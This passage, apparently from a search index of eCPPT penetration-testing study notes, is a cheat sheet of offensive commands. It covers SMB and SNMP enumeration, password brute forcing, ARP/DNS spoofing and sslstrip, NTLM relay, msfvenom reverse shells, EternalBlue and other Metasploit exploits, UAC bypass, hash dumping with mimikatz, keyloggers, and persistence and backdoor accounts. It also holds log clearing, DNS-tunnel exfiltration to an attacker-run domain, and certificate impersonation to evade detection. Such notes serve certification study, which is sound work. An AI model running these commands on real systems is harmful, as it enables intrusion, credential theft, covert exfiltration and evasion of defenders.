machine\n\nnbtstat -A &lt;target_IP&gt;                     #NetBIOS names on target machine\n</code></pre></p> <p>NetBIOS enumeration from Linux <pre><code>nbtscan -v &lt;target_IP&gt;                     #NetBIOS names on target machine\n\nnbtscan -v &lt;target_IP&gt;/24                  #NetBIOS names with subnetmask\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#smb-shared-folder","title":"SMB Shared folder","text":"<p>Resource enumeration from Windows <pre><code>net view &lt;target_IP&gt;                       #List shared resources\n\nnet use K: \\\\{target IP}\\{Share}           #Connect shared resource \n</code></pre></p> <p>BruteForce attempts for shares with Nat10bin <pre><code>nat.exe -u &lt;userlist&gt; -p &lt;passlist&gt; &lt;target_IP&gt;\n</code></pre></p> <p>Resource enumeration from Linux <pre><code>smbclient -N -L &lt;target_IP&gt;                   #List shared resources\n\nmount.cifs //{target_IP}/{Share} /media/myshare/ user=,pass=.   #Mount share\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#null-session","title":"Null Session","text":"<p>Check if system is vulnerable against Null Session <pre><code>net use \\\\&lt;target IP&gt;\\IPC$ \"\" /u:\"\"\n</code></pre></p> <p>Tools to enumerate target through Null Session - Windows</p> <p>Dumpsec <pre><code>1. Click `Report` -&gt; `Select Computer` -&gt; Insert Target IP\n2. Click `Report` -&gt; `Dump Users as column`\n3. After everything is set, click `OK`\n</code></pre> Winfingerprint </p> <p>Winfo <pre><code>winfo &lt;taget_IP&gt; -n\n</code></pre></p> <p>Tools to enumerate target through Null Session - Linux</p> <pre><code>enum4linux &lt;target_IP&gt;\n\nrpcclient -N -U \"\" &lt;target_IP&gt;\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#snmp","title":"SNMP","text":"<p>Script scan <pre><code>nmap -sU -p 161 --script [script_name] [target]\n</code></pre></p> <p>Community string Brute Force <pre><code>nmap -sU -p 161 --script snmp-brute [target]\n</code></pre></p> <p>Community string Brute Force with custom wordlist  <pre><code>nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=&lt;wordlist&gt; [target]\n\nWordlist - /usr/share/wordlist/seclists/Misc/wordlist-common-snmp-community-strings.txt\n</code></pre></p> <p>Enumeration : <pre><code>snmpwalk -v [1/2c/3] -c [community string] [target_ip] [MIB]\n</code></pre></p> <p>Change value of an attribute  <pre><code>snmpset -v [1/2c/3] -c [community string] [target_ip] [MIB] [var type] [value]\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#pivoting","title":"Pivoting","text":"<pre><code>meterpreter &gt; run autoroute -s 10.10.10.0/24\nmeterpreter &gt; run autoroute -p\n\nbackground\nuse auxiliary/server/socks_proxy\nshow options\nset SVRPORT [9050]\nset VERSION [4a]\nexploit\njobs\n\nbash &gt; proxychains nmap -sT -Pn -sV -p 445 10.10.11.15\n\n# Port Forwarding\nmeterpreter &gt; portfwd add -l 1234 -p 80 -r 10.100.40.107\n\n# Browse through proxy\nproxychains iceweasel\n\n# Communicate through victim2 to victim 1 -  10.10.11.0 and 10.10.10.0\nmeterpreter &gt; run autoroute -s 10.10.10.0/24\nmeterpreter &gt; run autoroute -s 10.10.11.0/24\nmsf &gt; # Set payload with LHOST of victim 1 and then traffic goes between them\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#sniffing-mitm-attacks","title":"Sniffing &amp; MITM Attacks","text":""},{"location":"eCPPT%20Materials/Network%20Security/#arp","title":"ARP","text":"<p>ARP scan <pre><code>arp-scan \n</code></pre></p> <p>Check ARP table : <pre><code>arp -a                               #Windows\n\narp                                  #Linux\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#sniffing-tools","title":"Sniffing Tools","text":"<pre><code>dsniff &lt;options&gt;\n</code></pre> <pre><code>Wireshark\n    http.request.method == \"POST\"\n    htt.authbasic\n</code></pre> <pre><code>Tcpdump &lt;options&gt; &lt;filter expresions&gt; \n    tcpdump -i eth0\n    tcpdump -i eth0 -xxAXXSs 0\n    tcpdump -i eth0 -xxAXXSs 0 dst [testination IP]\n    tcpdump -i eth0 host domain.com\n    tcpdump -i eth0 port 3389\n    tcpdump -i eth0 src [source_IP] and dst [destination_IP]\n    tcpdump -i eth0 -F [filter file]\n    tcpdump -i eth0 -w [output.txt]\n    tcpdump -i eth0 -r [output.txt]\n    tcpdump -i eth0 | grep [?]\n</code></pre> <pre><code>Windump\n</code></pre> <pre><code>driftnet &lt;options&gt;                         # Capture Photos during MITM\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#respondermultirelay","title":"# Responder/Multirelay","text":"<pre><code># Responder Tools - /usr/share/responder/tools/\n# Responder conf file - /usr/share/responder/responder.conf\n\n# Before run multiray attack, disable SMB and HTTP servers on responder.conf\n\npython RunFinger.py -i &lt;target_IP&gt;           # Check if SMB signing is disabled\n\nResponder -I eth0 --lm                       # Run responder\npython3 Multirelay.py -t &lt;target_IP&gt; -u ALL  # NTLM Relay to gain shell\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#mitm-tools","title":"MITM Tools","text":"<p>Ethercap <pre><code># /etc/ettercap/etter.dns                       # Dns Spoofing conf file\n\nettercap -G                                     # Run as Graphical Interface\n    Scan for Host\n    Add to Target 1 / Add to Target 2\n    Sniff Remote Connections\n    View &gt; Connections\n</code></pre></p> <p>Cain &amp; Abel <pre><code>Windows Tool for MITM attack\n\nrefference - https://gbhackers.com/man-in-the-middle-attack-with-cain-and-abel-tool/\n</code></pre></p> <p>Macof <pre><code>Mac flooding attack against switches. Note to run wireshark.\n\necho 1 &gt; /proc/sys/net/ipv4/ip_forward           # Enable port forwarding\nmacof -i [interface]                             # Run mac flooding\n</code></pre></p> <p>Arpspoof <pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n\narpspoof -i [interface] -t [target 1] [target 2]\narpspoof -i [interface] -t [target 2] [target 1]\n</code></pre></p> <p>Dnsspoof <pre><code># Redirect *.sportsfoo.com to 172.16.5.101\n\necho \"172.16.5.101 *.sportsfoo.com\" &gt; dns      \n\ndnsspoof -i [interface] -f dns\n</code></pre></p> <p>Bettercap <pre><code>net.probe on \nnet.sniff on\n\nhelp arp.spoof\nhelp dns.spoof\n</code></pre></p> <p>sslstrip <pre><code>sslstrip\n    echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n    iptables -t net -A PREROUTING -p top --destination-port 80 -j REDIRECT --to-port 8080\n    sslstrip -a -f -l 8080 -w els_sslt\n\n\nEthercap\n    Plugins &gt; Manage Plugins &gt; sslstrip\n\n\nBettercap\n    set https.proxy.sslstrip true\n    https.proxy on\n\n\nsslstrip+\n    python mitmf.py -i [interface] --spoof --arp --dns --hsts --gateway [gateway_IP] --targets [target_IP]\n</code></pre></p> <p>ICMP redirect <pre><code># Identify reachable networks.\n$ ip route show dev eth1\n\n#Configure attacker machine to perform IP masquerading.\n\necho 1 &gt; /proc/sys/net/ipv4/ip_forward\niptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o eth1 -j MASQUERADE\n\n\n#Run scapy and paste following code\n\noriginalRouterIP='10.100.13.1'\nattackerIP='10.100.13.20'\nvictimIP='10.100.13.126'\nserverIP='10.23.56.100'\n# We create an ICMP Redirect packet\nip=IP()\nip.src=originalRouterIP\nip.dst=victimIP\nicmpRedirect=ICMP()\nicmpRedirect.type=5\nicmpRedirect.code=1\nicmpRedirect.gw=attackerIP\n# The ICMP packet payload /should/ contain the original TCP SYN packet\n# sent from the victimIP\nredirPayloadIP=IP()\nredirPayloadIP.src=victimIP\nredirPayloadIP.dst=serverIP\nfakeOriginalTCPSYN=TCP()\nfakeOriginalTCPSYN.flags=\"S\"\nfakeOriginalTCPSYN.dport=80\nfakeOriginalTCPSYN.seq=444444444\nfakeOriginalTCPSYN.sport=55555\nwhile True:\n    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)\n</code></pre></p> <p>MITM Labs <pre><code>#Check Domain name\nnslookup                                         \n    server &lt;DNS Server&gt;\n    &lt;IP&gt;\n\n\n#Check gateway IP \ntraceroute 10.10.10.10 -m 5\n\n\n#Exploit Samba is_known_pipename()\nmsfconsole\n    use exploit/linux/samba/is_known_pipename\n    set RHOST 172.16.5.10\n    show advanced\n    set SMBUser admin\n    set SMBPass et1@sR7!\n    set LHOST 172.16.5.101\n    set SMB::AlwaysEncrypt false\n    exploit\n\n\n\n#Web Delivery Module\nmsfcoonsole\n    use exploit/multi/script/web_delivery\n    set TARGET 3\n    set LHOST 172.16.5.101\n    set PAYLOAD windows/meterpreter/reverse_tcp\n    exploit\n    jobs\n\n\nmeterpreter &gt; run arp_scanner -r 10.100.40.0/24.           # ARP Scan\nmeterpreter &gt; portfwd add -l 1234 -p 80 -r 10.100.40.107.  # Port Forwarding\n\n\nset PAYLOAD windows/meterpreter/bind_tcp   # Use this payload during pivoting\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#exploitation","title":"Exploitation","text":""},{"location":"eCPPT%20Materials/Network%20Security/#weak-and-default-passwords-brute-force","title":"Weak and Default Passwords / Brute Force","text":"<pre><code>/usr/share/ncrack/                          # Default Ncrack Wordlists\n\nncrack ftp://10.10.10.15:21\nncrack ftp://10.10.10.15:21 ssh://10.10.10.15:22\nncrack 10.10.10.10,15 -p ftp:21,smb\n\nncrack -u admin -P /usr/share/ncrack/top50000.pwd -f ssh://10.10.10.15 \n\nncrack -iX nmap_oX_output -u root -P /usr/share/wordlists/rockyou.txt\n\nncrack ftp://10.10.10.15:21 --save session\nncrack ftp://10.10.10.15:21 --resume session\n</code></pre> <pre><code>Medusa -d                                   # List all avaliable modules\nmedusa -M &lt;module&gt; -q                       # Module usage information\n\nmedusa -h 10.10.10.15 -M ssh -u root -P /usr/share/wordlist/rockyou.txt\n</code></pre> <pre><code>patator                                     # List all available modules\npatator &lt;module&gt; --help                     # Module usage information\n\npatator ftp_login host=10.10.10.15 user=root password=FILE0 0=wordlist.txt\n</code></pre> <pre><code>Hydra\nHydra -l root -P /usr/share/wordlist/rockyou.txt 10.10.10.15 ssh\n</code></pre> <pre><code>Eyewitness                             # Quickly identify low-hanging fruit\n./EyeWitness/Python/setup/setup.py.    # Setup\n\npython3 eyewitness.py --headless --prepared-https -f urls.txt\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#password-generator","title":"Password Generator","text":"<pre><code># Rsmangler - Tool for password permulation\n\ncat words.txt | rsmangler --file - &gt; mew_words.txt\n</code></pre> <pre><code># Cewl - Tool to take keywords form target website\n\ncewl -m 8 https://target.com\n</code></pre> <pre><code># Cupp - Tool to generate password depends on input\n\ncupp -i\n</code></pre> <pre><code># Crunch - Generate custom wordlist\n\ncrunch 8 8 -t ,@123456 -o wordlist.txt\n</code></pre> <pre><code>sed -ri '/^.{,7}$/d' william.txt                # Remove Passwords Shorter Than 8\nsed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt`.   # Remove Passwords With No Special Chars\n`sed -ri '/[0-9]+/!d' william.txt`              # Remove Passwords With No Numbers\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#exploit","title":"Exploit","text":"<p>SMB Capture With Metasploit <pre><code>msf &gt; use auxilary/server/capture/smb\n</code></pre></p> <p>Crack NTLMv1 hash with John/rainbow rcracki_mt rainbow tables <pre><code># Crack with John\njohn --format=netlm {hash file}\n\n\n# Crack with Rainbow Tables\n\n# halflm_second.rb - /usr/share/metasploit-framework/tools/password/\n# netntlm.pl - /usr/share/metasploit-framework/data/john/run.linux.x64.mmx/\n# netntlm.pl - /usr/share/john/netntlm.pl\n\nrckracki_mt -h {First 8 byte of LMHASH} -t 4 *.rti\n\nruby halflm_second.rb -n {Entire NTHASH} -p {Previosly cracked 8 byte NTHASH cleartext password}\n\nperl netntlm.pl -file {Hash file} -seed {Cracked Password}\n</code></pre></p> <p>SMB Relay Attack <pre><code>msf &gt; use exploit/windows/smb/smb_relay\n\nimpacket-smbrelayx -h {target_IP} -e smbexp.exe\n</code></pre></p> <p>NTLM Relay attack <pre><code>impacket-ntlmrelayx -t [target_IP] -smb2support\n</code></pre></p> <p>Generate msfvenom Payload <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o smbexp.exe \n\nmsf &gt; use exploit/multi/handler\n</code></pre></p> <p>SMTP Exploit <pre><code># Check if authentication is required\n\ntelnet &lt;IP&gt; 25\n&gt; EHLO domain.com\n\n-----------------------------------------------------------------------------\n\n# Python script to run unauthenticated with attachment\n\n    import smtplib\n    from email.mime.multipart import MIMEMultipart\n    from email.mime.text import MIMEText\n    from email.mime.application import MIMEApplication\n\n    # Email server settings\n    smtp_host = 'demo.ine.local'\n    smtp_port = 25\n\n    # Sender and recipient details\n    sender_email = 'sender@example.com'\n    recipient_email = 'recipient@example.com'\n\n    # Email content\n    subject = 'Test Email with Attachment'\n    body = 'This is a test email sent from Python with an attachment.'\n\n    # Create a MIMEMultipart object\n    msg = MIMEMultipart()\n    msg['Subject'] = subject\n    msg['From'] = sender_email\n    msg['To'] = recipient_email\n\n    # Attach body as plain text\n    msg.attach(MIMEText(body, 'plain'))\n\n    # Attach the file\n    attachment_path = '/path/to/attachment/file.txt'\n    with open(attachment_path, 'rb') as attachment_file:\n        part = MIMEApplication(attachment_file.read())\n        part.add_header('Content-Disposition', f'attachment; filename=\"{attachment_path}\"')\n        msg.attach(part)\n\n    try:\n        # Connect to the SMTP server\n        server = smtplib.SMTP(smtp_host, smtp_port)\n\n        # Send the email\n        server.sendmail(sender_email, [recipient_email], msg.as_string())\n\n        # Close the connection\n        server.quit()\n        print(\"Email with attachment sent successfully!\")\n    except Exception as e:\n        print(f\"Failed to send email with attachment: {e}\")\n</code></pre></p> <p>EternalBlue (MS17-010) <pre><code>msf &gt; use auxiliary/scanner/smb/smb_ms17_010            # Scan\n\nmsf &gt; use exploit/windows/smb/ms17_010_eternalblue      # Exploit\n</code></pre></p> <p>Client-Side Exploitation -  Mozilla Firefox resource: URL Remote Code Execution Vulnerability <pre><code>msf &gt; use exploit/multi/browser/firefox_pdfjs_privilege_escalation\nmsf &gt; info\nmsf &gt; set SRVHOST &lt;local_IP&gt;\nmsf &gt; set SVRPORT &lt;port&gt;\nmsf &gt; exploit\n</code></pre></p> <p>Client-Side Exploitation -  Adobe Flash Player ByteArray Use After Free <pre><code>msf &gt; use exploit/multi/browser/adobe_flash_hacking_team_uaf\n</code></pre></p> <p>Remote-Side Exploitation -  Microsoft Security Bulletin MS08-067 <pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi\n</code></pre></p> <p>MSFConsole <pre><code>msf &gt; help\nmsf &gt; search type:exploit platform:windows\nmsf &gt; search author:HDM\nmsf &gt; search cve:2015\nmsf &gt; grep vnc search type:exploit\n\nmsf &gt; show exploits\nmsf &gt; show payloads\n\nmsf &gt; info &lt;exploit&gt;\n\n\nmeterpreter &gt; background                                \nmeterpreter &gt; session -i &lt;session_id&gt;                  \nmeterpreter &gt; download\nmeterpreter &gt; upload\nmeterpreter &gt; edit\nmeterpreter &gt; execute -f cmd.exe -i H\nmeterpreter &gt; search -f &lt;file.*&gt;\nmeterpreter &gt; run post/windows/gather/enum_applications\nmeterpreter &gt; run post/windows gather/enum_services\n\nmeterpreter &gt; keyscan_start\nmeterpreter &gt; keyscan_dump\nmeterpreter &gt; keyscan_stop\n\nmeterpreter &gt; clearev                                     # Clear System logs\n\nmeterpreter &gt; load kiwi                                   # Load Mimikatz\nmeterpreter &gt; help\nmeterpreter &gt; creds_all\n</code></pre></p> <p>MSFConsole with Nessus <pre><code>service postgreqsl start                              # Start database\n\n\nmsf &gt; load nessus\nmsf &gt; nessus_connect user:password@localhost\nmsf &gt; nessus_scan_list\nmsf &gt; nessus_report_hosts &lt;id&gt;\nmsf &gt; nessus_reports_vulns &lt;id&gt;\nmsf &gt; nessus_db_import &lt;id&gt;\nmsf &gt; vulns                                           # List Vulnerabilities\n</code></pre></p> <p>Exploit Labs <pre><code>nmap -iN hosts --script vuln\n\nexploit/unix/ftp/proftpd_133c_backdoor                 # demo.ine.local\nexploit/multi/misc/java_rmi_server                     # demo2.ine.local\nauxiliary/scanner/mysql/mysql_authbypass_hashdump      # demo3.ine.local\nexploit/multi/http/apache_mod_cgi_bash_env_exec        $ demo4.ine.local\n\n-----------------------------------------------------------------------------\n\nNessus Scans\n\nauxiliary/scanner/ssl/openssl_heartbleed\n\n-----------------------------------------------------------------------------\n\nSMTP Exploit &gt; Send email with attachment &gt; Pivoting &gt; Badblue Exploit.\n\n-----------------------------------------------------------------------------\n\nArpspoof &gt; Dnsspoof &gt; msfvenom &gt; smbrelayx\n\narpspoof -i eth1 172.16.5.1 172.16.5.5\narpspoof -i eth1 172.16.5.5 172.16.5.1\necho \"172.16.5.101 *.sportsfoo.com\" &gt; dns\ndnsspoof -i eth1 -f dns\nimpacket-ntlmrelayx -t 172.16.5.10 -smb2support\nimpacket-smbrelayx -h 172.16.5.10\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#post-exploitation","title":"Post Exploitation","text":""},{"location":"eCPPT%20Materials/Network%20Security/#privilege-escalation","title":"Privilege Escalation","text":"<p>Windows <pre><code># Migrate Process to avoid session lossing the session\nmeterpreter &gt; run post/windows/manage/migrate\n\nmeterpreter &gt; migrate -h\nmeterpreter &gt; migrate &lt;PID&gt;\n\n-----------------------------------------------------------------------------\n# Automatically escalate privilege by finding best technique\nmeterpreter &gt; getsystem\nmeterpreter &gt; getuid\n\n-----------------------------------------------------------------------------\n# UAC Bypass\nmeterpreter &gt; run post/windows/gather/win_priv      # Check if UAC is enabled\nmeterpreter &gt; search bypassuac\nmsf &gt; use exploit/windiws/local/bypass_vbs\nmsf &gt; set session &lt;session_id&gt;\nmsf &gt; exploit                            # Gain administrator rights\nmeterpreter &gt; getsystem                  # From administrator to NT/authority\n\n\nhttps://github.com/hfiref0x/UACME\nmeterpreter &gt; upload Akagi64.exe\nmeterpreter &gt; upload Payload.exe                  # Msfvenom reverse shell\nshell &gt; .\\Akagi64.exe 23 C:\\Payload.exe           # 32 bit system\nshell &gt; .\\Akagi64.exe 61 C:\\Payload.exe           # 32 bit system\n\n\n-----------------------------------------------------------------------------\n# Incognito - Impersonate windows tokens\nmeterpreter &gt; use incognito              # Better to run with system priv.\nmeterpreter &gt; list_tokens -u             # List all available tokens\nmeterpreter &gt; impersonate_token &lt;token&gt;  # Impersonate other user\n\n-----------------------------------------------------------------------------\n# Unquoted service path - Exploit service with path injection\nC:\\&gt; wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |finder /i /v \"\"\"        # wmic command to search unqouted service path\n\nC:\\&gt; sc qc &lt;service&gt;                                   # manual check\nC:\\&gt; sc start &lt;service&gt;                                # start service\nC:\\&gt; sc stop &lt;service&gt;                                 # stop service\n\nmsf&gt; use exploit/windows/local/trusted_service_path    # automatically check\n\nmsf exploit(multi/handler)&gt; set AutoRunScript migrate -n svchost.exe # Auto run migrate when meterpreter session is captured due to stable reasons.\n\nC:\\&gt; icacls &lt;folder&gt;                            # Check folder permissions\n\n-----------------------------------------------------------------------------\n</code></pre></p> <p>Linux <pre><code># Gather Info\nmeterpreter &gt; run post/linux/gather/enum_system\n\n\n# Publicly available privilage escalation exploits\nmeterpreter &gt; upload exploit.c\nmeterpreter &gt; shell                                   # Run Shell\nmeterpreter &gt; execute -f /bin/sh -i -c                # Run Shell\nshell &gt; gcc exploit.c -o exploit\nshell &gt; ./exploit\n\nattacker &gt; gcc -m32 exploit.c -o exploit           # Compile on local machine\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#maintaining-access","title":"Maintaining Access","text":"<p>Password and Hash <pre><code>meterpreter &gt; run hashdump\nmeterpreter &gt; run post/windows/gather/smart_hashdump      # Dump hashes\n\nmsf &gt; use exploit/windows/smb/psexec             # PTH\nimpacket-psexec                                  # PTH\n\n-----------------------------------------------------------------------------\n\n# When user is in administrator group but stil cant PTH, enable \nPS&gt; Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LocalAccountTokenFitlerPolicy -Value 1 -Type DWord\n\nPS&gt; Set-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters -Name LocalAccountTokenFitlerPolicy -Value 1 -Type DWord\n\nOR\n\nC:\\&gt; reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" \\v LocalAccountTokenFilterPolicy /t REG_WORD /d 1 /f\n\nC:\\&gt; reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" \\v RequireSecuritySignature /t REG_WORD /d 0 /f\n\n-----------------------------------------------------------------------------\n\n# XfreeRDP\n\nxfreerdp /u:user /d:domain /pth:hash /v:host\n\n-----------------------------------------------------------------------------\n\n# Mimikatz - Note to run meterpreter shell as 64 bit\n\nmeterpreter &gt; ps -A x86_64 -s                 # Search 64bit process\nmeterpreter &gt; migrate &lt;64bit_process_pid&gt;     # Change shell to 64bit\nmeterpreter &gt; load mimikatz                   # Load mimikatz\n\n\n-----------------------------------------------------------------------------\n\n# Windows Credentials Editor\n# https://web.archive.org/web/20200414231958/http:/www.ampliasecurity.com/research/windows-credentials-editor/\n\nmeterpreter &gt; execute -i -f wce.exe -a -h\n\n-----------------------------------------------------------------------------\n\n# Enable RDP service\nshell&gt; net start                     # List enabled services\nshell&gt; wmic service where 'Caption like \"Remote%\" and started=true' get Caption                              # Check if RDP is enabled\n\nmeterpreter &gt; run service_manager -1                      # Check services\nmeterpreter &gt; run post/windows/gather/enum_services       # Check services\n\nmeterpreter &gt; run getgui -h\nmeterpreter &gt; run getgui -e                       # Enable RDP\n\nshell&gt; net localgroup \"Remote Desktop Users\" els_user /add    # Add user to RDP Group\n\nrdesktop &lt;IP&gt; -u &lt;user&gt; -p &lt;passwd&gt;               # Login with RDP\n\nnet localgroup                                    # List all local groups\nnet localgroup &lt;group&gt;                            # List members of group\nnet localgroup \"Administrators\" &lt;user&gt; /add       # Add user to adm group\n</code></pre></p> <p>Backdoor <pre><code># Persistence\nmeterpreter &gt; run persistence -h\nmeterpreter &gt; run persistence -A -X -i [time] -P [port] -r [attacked_IP]\n\nmsf &gt; use exploit/windows/local/persistence\n\n\n# Persistence using manual payload generated by MSFvenom/Veil/BDF\n\nC:\\&gt; reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -d \"payload.exe\" -v payload_name            # Add generated payload to startup\n</code></pre></p> <p>New Users <pre><code>net user &lt;username&gt; &lt;password&gt; /add                   # Create new user\nnet localgroup \"Administrators\" &lt;username&gt; /add       # Add user to adm group\nnet localgroup \"Remote Desktop Users\" &lt;user&gt; /add     # Add user to RDP group\nnet localgroup \"TelnetClients\" &lt;user&gt; /add         # Add user to telnet group\n</code></pre></p> <p>DLL Hijacking/Preloading <pre><code># Process Explorer\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer\n\n# Process Monitor\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/procmon\n\n# list of Vulnerable Applications\nhttps://web.archive.org/web/20140222035441/https:/www.exploit-db.com/dll-hijacking-vulnerable-applications/\n\n\n\nWhen a program is launched, the DLL Search Order in most cases is as follows:\n\n1.The directory from which the application was launched\n2.The\u00a0`C:\\Windows\\System32`\u00a0directory\n3.The 16-bit Windows system directory (i.e,\u00a0`C:\\windows\\system`)\n4.The Windows directory (`C:\\windows`)\n5.The current directory at the time of execution\n6.Any directories specified by the %PATH% environment variable\n\n\nProcess Explorer - Identify file PATH and associated services  \n\nProcess Monitor - Apply filters to check what DLL are loaded.\n\nServices - Stop and start services to display dll processes on Process Monitor\n\n# Run Process Monitor with following filters\nResult       &gt; contains &gt;  NAME NOT FOUND\nPath         &gt; end with &gt;  .dll\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#data-harvestingpillaging","title":"Data Harvesting/Pillaging","text":"<pre><code>meterpreter &gt; sysinfo                            # System info\nC:\\ &gt; systeminfo                                 # System info\nmeterpreter &gt; getuid                             # Check user we are running\n\nmeterpreter &gt; run post/windows/gather/           # Windows gather scripts\nmeterpreter &gt; run post/linux/gather/             # Linux gather scripts\nmeterpreter &gt; ps                                 # Enum services\n\nC:\\ &gt; wmic service get Caption,StartName,State,pathName  # Enum services\nC:\\ &gt; net start                                          # Enum services\nC:\\ &gt; netstat -ano                                       # Enum services\n\n$ service --status-all                                   # Enum services\n\nC:\\ &gt; net view /domain                                 # Gather domain name\nmeterpreter &gt; run post/windows/gather/enum_domains   # Enum domain/controller\nC:\\ &gt; net group \"Domain Contollers\" /domain      # List of domain controllers\n\nmeterpreter &gt; run post/windows/gather/enum_ad_users    # Enum AD Users\nC:\\ &gt; net user /domain                                 # Enum AD Users\n\nC:\\ &gt; net localgroup                              # Enum local groups\nC:\\ &gt; net localgroup \"Administrators\"        # View members of Administrators\n\nC:\\ &gt; net share                                   # Enum shares\nmeterpreter &gt; run enum_shares                     # Enum shares\n\nmeterpreter &gt; run scraper                     # Windowns Enum\nmeterpreter &gt; run winenum                     # Windows Enum\n\n-----------------------------------------------------------------------------\n\n# Keylogger\nmeterpreter &gt; keyscan_start                          # Start Keylogger\nmeterpreter &gt; keyscan_dump                           # Dump Keys\nmeterpreter &gt; keyscan_stop                           # Stop Keylogger\n\nNote: Migrate to winlogon.exe in order to DUMP windows logon credentials.\nNote: Migrate to explorer.exe in order to DUMP user level activities.\n\nmeterpreter &gt; run keylogrecorder -h             # Keylogger\nmeterpreter &gt; run keylogrecorder -c 1           # Keylogger with winlogon.exe\nmeterpreter &gt; run keylogrecorder -c 0           # Keylogger with explorer.exe\n\n-----------------------------------------------------------------------------\n\nmeterpreter &gt; search -h \nmeterpreter &gt; search -d C:\\\\Users\\\\els\\\\ -f *.kdbx    # Search KeePass file\n\n\nmeterpreter &gt; run post/windows/gather/credentials/    # List modules related to Credentials\nmeterpreter &gt; run post/windows/gather/credentials/winscp  # Enum Passwords on local system\nmeterpreter &gt; run post/windows/gather/credentials/credential_collector  # Dump Hashes and Tickets\nmeterpreter &gt; run post/windows/gather/enum_chrome     # Retrieve Creds stored in Chrome\n\nmeterpreter &gt; run post/multi/gather/            # List Another gather modules\nmeterpreter &gt; run post/windows/gather/enun_applications   # Enum Applications\n</code></pre> <p>Data Exfitration with DNS Tunelling <pre><code>#https://github.com/yarrick/iodine\n\n1. Register domain name through godaddy.com - For example attackerdomain.com\n2. Host on the internet to use as DNS server. - for example 100.50.50.100\n3. Add Hostnames on godaddy.com - ns1.attackerdomain.com / ns2.attackerdomain.com with IP address of our created host 100.50.50.100\n4. Change Nameservers to ns1.attackerdomain.com and ns2.attackerdomain.com on godaddy.com\n\nConfigure iodine as server on 100.50.50.100 host \n    iodine -u user -p 'Password123' -f 10.0.0.1 ns1.attackerdomain.com\n\nConfigure iodine as client on internal host\n    iodine -p \"Password123\" ns1.attackerdomain.com -T CNAME -r -f \n\nCheck if we got new Network Interface with ifconfig command\n\nIn order to tunnel all of our data securely, create local SSH socks proxy\n    ssh user@10.0.0.1 -D 10.0.0.2:1234 -N -C \n\nUse browser as SOCKS5 proxy with 10.0.0.2:1234\n</code></pre></p> <p>Post Exploitation Scripts Windows Post-Exploitation Linux/Unix/BSD Post-Exploitation # Linux Post Exploitation OS X Post-Exploitation Metasploit Post-Exploitation</p> <p>Offline Tool for Post Exploitation - post-exploitation-wiki</p>"},{"location":"eCPPT%20Materials/Network%20Security/#mapping-internal-network","title":"Mapping Internal Network","text":"<pre><code># Network Interfaces\nmeterpreter &gt; ifconfig\nC:\\ &gt; ipconfig /all\nC:\\ &gt; ipconfig /displaydns                             # DNS cache\n$ ifconfig\n\n# Route \nmeterpreter &gt; route\nC:\\ &gt; route print\n$ route -v\n\n# Arp cache\nmeterpreter &gt; arp\nC:\\ &gt; arp -a\n$ arp\n\n# Opened/Connected/Estabilished Ports/Hosts\nmeterpreter &gt; netstat\nC:\\ &gt; netstat -ano\n$ netstat -tulpn\n\n# internal host detection\nmeterpreter &gt; run arp_scanner -h\nmeterpreter &gt; run arp_scanner -r 10.10.10.0/24\n\n# Ping scan\nmsf &gt; use post/multi/gather/ping_sweep\n\n# Port scan\nmsf &gt; use auxiliary/scanner/portscan/\n\n# Network enumerator \nmeterpreter &gt; run netenum -h\n</code></pre> <p>Meterpreter SSL Certificate Impersonation and Detection Evasion <pre><code># Generate SSL Payload to impersonate as Microsoft SLL certificate\nmsf &gt; use auxiliary/gather/impersonate_ssl\nmsf &gt; set RHOST www.microsoft.com\nmsf &gt; run\nmsf &gt; use payload windows/x64/meterpreter/reverse_https\nmsf &gt; set LHORT [local_IP]\nmsf &gt; set LPORT 443\nmsf &gt; set handlersslcert [generated .pem file]\nmsf &gt; set stagerverifysslcert true\nmsf &gt; generate -t exe -f /ssl_payload.exe\n\n# Set Multi Handler\nmsf &gt; use exploit/multi/handler\nmsf &gt; set LHOST [local_IP]\nmsf &gt; set LPORT 443\nmsf &gt; set handlersslcert [generated .pem file]\nmsf &gt; set stagerverifysslcert true\nmsf &gt; set payload windows/x64/meterpreter/reverse_https\nmsf &gt; exploit -j\n\n# Run ssl_payload.exe on target and check traffic in wireshark to verify that Microsoft SSL certificate is used to encrypt data in order to evasion of detection systems.\n</code></pre></p> <p>Obtaining Stored Credentials with SessionGopher <pre><code># https://github.com/Arvanaghi/SessionGopher\n\n# Run Locally\n.\\SessionGopher.ps1\nInvoke-SessionGopher -Thorough\n\n# Run Remotely\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p 